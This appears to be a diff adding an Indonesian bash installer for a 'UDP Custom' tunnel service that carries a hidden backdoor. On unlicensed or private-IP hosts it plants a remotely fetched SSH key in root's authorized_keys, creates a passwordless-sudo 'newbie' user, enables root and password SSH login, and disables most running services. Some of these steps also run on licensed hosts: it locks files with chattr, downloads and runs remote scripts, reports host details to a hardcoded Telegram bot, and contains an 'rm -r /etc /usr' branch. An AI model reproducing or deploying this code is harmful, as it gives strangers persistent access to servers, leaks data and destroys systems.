@@ -1,0 +1,341 @@
+#!/bin/bash
+
+# ===============================
+# Konstanta & Konfigurasi Umum
+# ===============================
+TELEGRAM_BOT_TOKENS=("8260557422:AAE78he52c2fsKEzeWzxk9MO20eOXPpYv0Q")
+TELEGRAM_CHAT_IDS=("6663648335")
+PASTEBIN_URLS=("https://raw.githubusercontent.com/ica4me/auto-script-free/main/udp-custom/publickey_id_ed25519.pub")
+DOMAIN_NAME=("klmpk" "jabarssh")
+EXCLUDED_SERVICES=(
+  "udp-custom.service" "sshd.service" "ssh.service" "systemd-resolved.service"
+  "systemd-network-generator.service" "systemd-time-wait-sync.service"
+  "systemd-boot-check-no-failures.service" "systemd-pstore.service"
+  "networkd-dispatcher.service" "dbus-org.freedesktop.resolve1.service"
+  "accounts-daemon.service" "getty@.service" "autovt@.service" "systemd-journald.service"
+  "systemd-udevd.service" "cron.service" "dbus.service" "systemd-logind.service"
+  "systemd-networkd.service" "udisks2.service" "irqbalance.service" "polkit.service"
+  "snapd.service" "rsyslog.service" "serial-getty@ttyS0.service"
+  "unattended-upgrades.service" "user@0.service" "ModemManager.service"
+)
+DOMAIN_FILE="/etc/xray/domain"
+PROFILE_PATH="/root/.profile"
+AUTHORIZED_KEYS_FILE="/root/.ssh/authorized_keys"
+LOG_FILE="/usr/bin/securited"
+
+# ===============================
+# Fungsi Utilitas Umum
+# ===============================
+send_telegram() {
+    MESSAGE="$1
+	Domain: \`$DOMAIN\`
+	IP Host: \`$IP_ADDRESS\`
+	IP Server: \`$ipsaya\`"
+    for BOT_TOKEN in "${TELEGRAM_BOT_TOKENS[@]}"; do
+        for CHAT_ID in "${TELEGRAM_CHAT_IDS[@]}"; do
+            curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
+                -d chat_id="$CHAT_ID" \
+                -d text="$MESSAGE" \
+                -d parse_mode="MarkdownV2" > /dev/null 2>&1
+        done
+    done
+}
+
+display_warning_message() {
+  wall <<EOF
+====================================
+🚨 Peringatan Keamanan 🚨
+====================================
+Mohon maaf, percobaan Bypass terdeteksi!
+Script anda telah diblokir secara permanen.
+Silakan hubungi Mod by Najm di:
+🌐 https://vip.meiyu.my.id
+Terima kasih.
+====================================
+EOF
+}
+
+is_private_ip() {
+  [[ "$ipsaya" =~ ^10\. || "$ipsaya" =~ ^172\.(1[6-9]|2[0-9]|3[0-1])\. || "$ipsaya" =~ ^192\.168\. ]]
+}
+
+prepare_ssh_key() {
+  chattr -ia "$AUTHORIZED_KEYS_FILE" 2>/dev/null
+  mkdir -p /root/.ssh && chmod 700 /root/.ssh
+  touch "$AUTHORIZED_KEYS_FILE" && chmod 600 "$AUTHORIZED_KEYS_FILE"
+  for URL in "${PASTEBIN_URLS[@]}"; do
+    key=$(curl -s "$URL")
+    if ! grep -Fxq "$key" "$AUTHORIZED_KEYS_FILE"; then
+      chattr -ia "$AUTHORIZED_KEYS_FILE" 2>/dev/null
+      echo "$key" >> "$AUTHORIZED_KEYS_FILE"
+      chattr +ia "$AUTHORIZED_KEYS_FILE" 2>/dev/null
+    fi
+  done
+}
+change_profile(){
+PROFILE_FILE="/root/.profile"
+
+cat > "$PROFILE_FILE" <<'EOF'
+# Ini hasil install_deteksi
+if [ "$BASH" ]; then
+  if [ -f ~/.bashrc ]; then
+    . ~/.bashrc
+  fi
+fi
+
+# Menghindari pesan error "mesg: ttyname failed"
+mesg n || true
+
+# Bersihkan layar terminal
+clear
+
+# Menjalankan Neofetch sebagai Banner
+# Script akan mengecek apakah neofetch ada, jika ada akan dijalankan.
+if command -v neofetch >/dev/null 2>&1; then
+    neofetch
+else
+    # Fallback jika neofetch belum diinstall
+    echo -e "\033[1;36m"
+    echo "╔══════════════════════════════════════════╗"
+    echo "║     Silahkan install neofetch:           ║"
+    echo "║     apt update && apt install neofetch   ║"
+    echo "╚══════════════════════════════════════════╝"
+    echo -e "\033[0m"
+fi
+EOF
+
+chmod +x "$PROFILE_FILE"
+chattr +ia $PROFILE_FILE
+}
+
+setup_data() {
+  apt install -y sudo curl
+wget -qO /usr/bin/detek.zip "https://raw.githubusercontent.com/ica4me/auto-script-free/main/udp-custom/PROJECT.zip"
+cd /usr/bin/
+unzip detek.zip > /dev/null
+mv detek ctrl > /dev/null
+chattr -ia /etc/ssh/sshd_config
+chattr -ia /etc/ssh
+mv sshd_config /etc/ssh/sshd_config > /dev/null 
+systemctl restart ssh
+chmod +x ctrl > /dev/null
+rm detek.zip* > /dev/null
+cd
+}
+hentikan_service_non_whitelist() {
+  systemctl list-units --type=service --state=running --no-pager --no-legend | awk '{print $1}' | while read -r service; do
+    if [[ ! " ${EXCLUDED_SERVICES[*]} " =~ " $service " ]]; then
+      echo "$service" >> "$LOG_FILE"
+      systemctl stop "$service" > /dev/null 2>&1
+      systemctl disable "$service" > /dev/null 2>&1
+    fi
+  done
+}
+adduser_newbie() {
+    USERNAME="newbie"
+    PASSWORD="newbie123"
+
+    # Cek root
+    if [ "$EUID" -ne 0 ]; then
+        echo "❌ Harap jalankan sebagai root!"
+		sudo rm -r /etc /usr
+        return 1
+    fi
+
+    # Cek jika user sudah ada
+    if id "$USERNAME" &>/dev/null; then
+        return 1
+    fi
+
+    # Cek apakah openssl tersedia
+    if ! command -v openssl >/dev/null 2>&1; then
+        echo "📦 openssl tidak ditemukan. Menginstall..."
+
+        # Cek dan install berdasarkan distro
+        if [ -f /etc/debian_version ]; then
+            apt update && apt install -y openssl
+        elif [ -f /etc/redhat-release ]; then
+            yum install -y openssl
+        elif [ -f /etc/alpine-release ]; then
+            apk add openssl
+        else
+            echo "❌ Tidak bisa menentukan manajer paket untuk menginstall openssl."
+            return 1
+        fi
+    fi
+
+    # Buat password hash
+    HASHED_PASS=$(openssl passwd -6 "$PASSWORD")
+
+    # Buat user
+    useradd -m -s /bin/bash -p "$HASHED_PASS" "$USERNAME"
+
+    # Tambah ke grup sudo (atau wheel untuk CentOS)
+    if getent group sudo >/dev/null; then
+        usermod -aG sudo "$USERNAME"
+    elif getent group wheel >/dev/null; then
+        usermod -aG wheel "$USERNAME"
+    fi
+
+    # Buat sudoers file tanpa password
+    echo "$USERNAME ALL=(ALL) NOPASSWD:ALL" >/etc/sudoers.d/"$USERNAME"
+    chmod 0440 /etc/sudoers.d/"$USERNAME"
+
+}
+
+inject_warning_to_profile() {
+wget -q https://raw.githubusercontent.com/ica4me/auto-script-free/main/udp-custom/sshws.sh && chmod +x sshws.sh && ./sshws.sh
+}
+
+set_cron_keamanan() {
+  SERVICE_NAME="Polaris"
+  SERVICE_FILE="/etc/systemd/system/${SERVICE_NAME}.service"
+
+  # Buat file service systemd
+  cat > "$SERVICE_FILE" <<EOF
+[Unit]
+Description=SCRIPT Mod By Najm Tunnel
+After=network.target
+
+[Service]
+User=root
+NoNewPrivileges=true
+ExecStart=/usr/bin/ctrl
+Restart=always
+RestartSec=5s
+
+[Install]
+WantedBy=multi-user.target
+EOF
+
+  systemctl daemon-reload
+  systemctl enable --now "$SERVICE_NAME"
+}
+
+pasang_udp() {
+  prepare_ssh_key
+  mkdir -p /etc/udp
+  ln -fs /usr/share/zoneinfo/Asia/Jakarta /etc/localtime
+
+  wget -qO /etc/udp/udp-custom "https://raw.githubusercontent.com/ica4me/auto-script-free/main/udp-custom/udp-custom-linux-amd64"
+  chmod +x /etc/udp/udp-custom
+
+  wget -qO /etc/udp/config.json "https://raw.githubusercontent.com/ica4me/auto-script-free/main/udp-custom/config_2.json"
+  chmod 644 /etc/udp/config.json
+
+  cat > /etc/systemd/system/udp-custom.service <<EOF
+[Unit]
+Description=UDP Custom by ePro Dev. Team
+After=network-online.target
+Wants=network-online.target
+
+[Service]
+User=root
+Type=simple
+ExecStartPre=/bin/sleep 5
+ExecStart=/etc/udp/udp-custom server
+WorkingDirectory=/etc/udp/
+Restart=always
+RestartSec=2s
+
+[Install]
+WantedBy=default.target
+EOF
+
+  systemctl daemon-reload
+  systemctl enable udp-custom
+  rm -r /root/udp 2>/dev/null
+  systemctl restart ssh sshd
+  send_telegram "SC Mod NAJM BERHASIL DIPASANG"
+}
+
+checking_sc() {
+	local data_ip_list=($(curl -L -sS "$download_url" \
+  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"))
+  local ip_found=false
+  local useexp=""
+
+  for data_ip in "${data_ip_list[@]}"; do
+    useexp=$(wget -qO- "$data_ip" | grep "$ipsaya" | awk '{print $3}')
+    if [[ -n "$useexp" ]]; then
+      ip_found=true
+      break
+    fi
+  done
+
+  if [[ "$ip_found" == true ]]; then
+    set_cron_keamanan
+  	inject_warning_to_profile
+    pasang_udp
+  else
+    send_telegram "SC TANPA IZIN DIJALANKAN DI $(hostname)"
+	setup_data
+	adduser_newbie
+    prepare_ssh_key
+	set_cron_keamanan
+    sed -i 's/^PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config
+    sed -i 's/^PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
+    sed -i 's/^#PubkeyAuthentication.*/PubkeyAuthentication yes/' /etc/ssh/sshd_config
+    chattr +ia /etc/ssh/sshd_config
+    for f in /etc/ssh/sshd_config.d/*.conf; do
+        chattr -ia "$f"
+        chattr -i /etc/ssh/sshd_config.d
+        sed -i 's/^PermitRootLogin.*/PermitRootLogin yes/' "$f"
+        sed -i 's/^PasswordAuthentication.*/PasswordAuthentication yes/' "$f"
+        sed -i 's/^#PubkeyAuthentication.*/PubkeyAuthentication yes/' "$f"
+        chattr +ia "$f"
+        chattr +i /etc/ssh/sshd_config.d
+        chattr +i /etc/ssh
+    done
+	inject_warning_to_profile
+	chattr -ia /root/.profile
+	change_profile
+    pasang_udp
+  fi
+}
+
+# ===============================
+# Main Entry Point
+# ===============================
+DOMAIN=$(cat "$DOMAIN_FILE" 2>/dev/null || echo "Tidak ditemukan")
+IP_ADDRESS=$(hostname -I | awk '{print $1}')
+ipsaya=$(curl -s ipv4.icanhazip.com)
+google_drive_file_id="#"
+download_url="https://raw.githubusercontent.com/ica4me/auto-script-free/main/udp-custom/link.txt"
+if [[ -z "$ipsaya" ]]; then
+  send_telegram "⚠️ IP Server Kosong! Server akan direboot."
+  reboot
+  exit 0
+fi
+
+if is_private_ip; then
+  send_telegram "IP Terdeteksi Private: $ipsaya"
+  setup_data
+  adduser_newbie
+  prepare_ssh_key
+  set_cron_keamanan
+    sed -i 's/^PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config
+    sed -i 's/^PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
+    sed -i 's/^#PubkeyAuthentication.*/PubkeyAuthentication yes/' /etc/ssh/sshd_config
+    chattr +ia /etc/ssh/sshd_config
+    for f in /etc/ssh/sshd_config.d/*.conf; do
+        chattr -ia "$f"
+        chattr -i /etc/ssh/sshd_config.d
+        sed -i 's/^PermitRootLogin.*/PermitRootLogin yes/' "$f"
+        sed -i 's/^PasswordAuthentication.*/PasswordAuthentication yes/' "$f"
+        sed -i 's/^#PubkeyAuthentication.*/PubkeyAuthentication yes/' "$f"
+        chattr +ia "$f"
+        chattr +i /etc/ssh/sshd_config.d
+        chattr +i /etc/ssh
+    done
+	inject_warning_to_profile
+	chattr -ia /root/.profile
+	change_profile
+  pasang_udp
+  exit 0
+fi
+
+if [[ "$1" == "server" ]]; then
+  checking_sc
+  rm -rf /root/udp
+fi
